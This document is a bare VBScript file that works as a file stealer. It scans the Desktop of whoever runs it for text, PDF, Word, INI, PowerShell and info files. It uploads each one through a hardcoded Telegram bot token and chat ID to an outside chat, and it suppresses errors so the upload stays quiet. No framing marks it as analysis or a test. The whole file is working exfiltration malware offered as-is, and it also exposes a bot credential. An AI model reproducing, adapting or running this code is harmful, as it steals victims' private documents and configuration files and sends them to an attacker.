Dim botToken, chatId, desktopPath, fso, shell
botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
desktopPath = shell.SpecialFolders("Desktop")

Function IsTarget(fName)
    Dim ext: ext = LCase(fso.GetExtensionName(fName))
    If ext="txt" Or ext="pdf" Or ext="docx" Or ext="ini" Or ext="ps1" Or ext="info" Then
        IsTarget = True
    Else
        IsTarget = False
    End If
End Function

Sub UploadFile(filePath)
    Dim fileName: fileName = fso.GetFileName(filePath)
    Dim boundary: boundary = "----VBScriptBoundary123456"
    Dim url: url = "https://api.telegram.org/bot" & botToken & "/sendDocument"
    
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 
    stream.Open
    stream.LoadFromFile filePath
    Dim fileContent: fileContent = stream.Read
    stream.Close
    
    Dim body
    body = "--" & boundary & vbCrLf & _
           "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & _
           chatId & vbCrLf & _
           "--" & boundary & vbCrLf & _
           "Content-Disposition: form-data; name=""document""; filename=""" & fileName & """" & vbCrLf & _
           "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
           
    Dim objRS: Set objRS = CreateObject("ADODB.Recordset")
    objRS.Fields.Append "bin", 205, LenB(body)
    objRS.Open
    objRS.AddNew
    objRS.Fields("bin").AppendChunk(body)
    objRS.Fields("bin").AppendChunk(fileContent)
    objRS.Fields("bin").AppendChunk("--" & boundary & "--" & vbCrLf)
    objRS.Update
    
    Dim http: Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    http.Send objRS.Fields("bin").Value
    
    Set http = Nothing: Set objRS = Nothing
End Sub

Dim folder: Set folder = fso.GetFolder(desktopPath)
Dim file
For Each file In folder.Files
    If IsTarget(file.Name) Then
        On Error Resume Next 
        UploadFile file.Path
        On Error GoTo 0
    End If
Next
